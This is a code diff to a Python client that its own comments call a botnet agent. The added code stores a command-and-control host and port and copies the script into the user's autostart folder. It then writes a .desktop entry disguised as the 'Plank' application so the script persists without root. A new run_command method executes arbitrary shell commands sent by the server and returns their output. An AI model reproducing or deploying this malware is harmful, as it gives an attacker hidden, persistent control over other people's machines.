@@ -5,8 +5,17 @@ import sys
 import shutil
 import socket
 import time
+import subprocess
+import stat
 
 class client:
+    # socket for connection to the server
+    sock_to_server = None
+    # ip address of our C&C server, can be changed depending on what ip server is located
+    host = '0.0.0.0'
+    # port of the server to connect to, can be changed depending on what port server is listening at
+    port = 3000
+
     def __init__(self):
         # deamonize the process
         self.daemonize()
@@ -21,6 +30,9 @@ class client:
         while True:
             time.sleep(10)
 
+        # for testing running the command, will remove later
+        # result = self.run_command(str.encode("ls"))
+        # print(result)
 
 
     def daemonize(self):
@@ -70,12 +82,51 @@ class client:
     def copy_client(self):
         auto_config_dir = os.path.join(os.getenv("HOME"), ".config", "autostart")
         auto_config_file = os.path.join(auto_config_dir, "client.py")
+        auto_config_desktop = os.path.join(auto_config_dir, "client.desktop")
         try:
             if not os.path.exists(auto_config_dir):
                 os.mkdir(auto_config_dir)
-            shutil.copyfile(__file__, auto_config_file)
+
+            if not os.path.exists(auto_config_file):
+                shutil.copyfile(__file__, auto_config_file)
+                st = os.stat(__file__)
+                os.chmod(auto_config_file, st.st_mode | stat.S_IEXEC)
+
+            # create the autostart .desktop, this is the only way to autostart without root permission
+            # a desktop environment like gnome must be present and running on client machine
+            file_content = "[Desktop Entry]\n" \
+                            "Name=Plank\n" \
+                            "GenericName=client\n" \
+                            "Comment=Evil Botnet\n" \
+                            "Categories=Utility;\n" \
+                            "Type=Application\n" \
+                            "Exec={}\n" \
+                            "Terminal=false\n" \
+                            "NoDisplay=false\n" \
+                            .format(auto_config_file)
+            
+            if not os.path.exists(auto_config_desktop):
+                with open(auto_config_desktop, 'w') as file:
+                    file.write(file_content)
         except Exception as e:
             print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)
+
+    # note that cmd parameter is in network bytes
+    def run_command(self, cmd):
+        # if command from server is cd
+        if cmd[:2].decode("utf-8") == "cd":
+            os.chdir(cmd[3:].decode("utf-8"))
+
+        # run the command from the server
+        if len(cmd) > 0:
+            result = subprocess.Popen(cmd[:].decode("utf-8"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            result_in_bytes = result.stdout.read() + result.stderr.read()
+            result_in_string = str(result_in_bytes, "utf-8")
+            return result_in_string
+
+        # this means the command is empty, returns no result in this case
+        return None
+
 
 if  __name__ ==  '__main__':
     client()
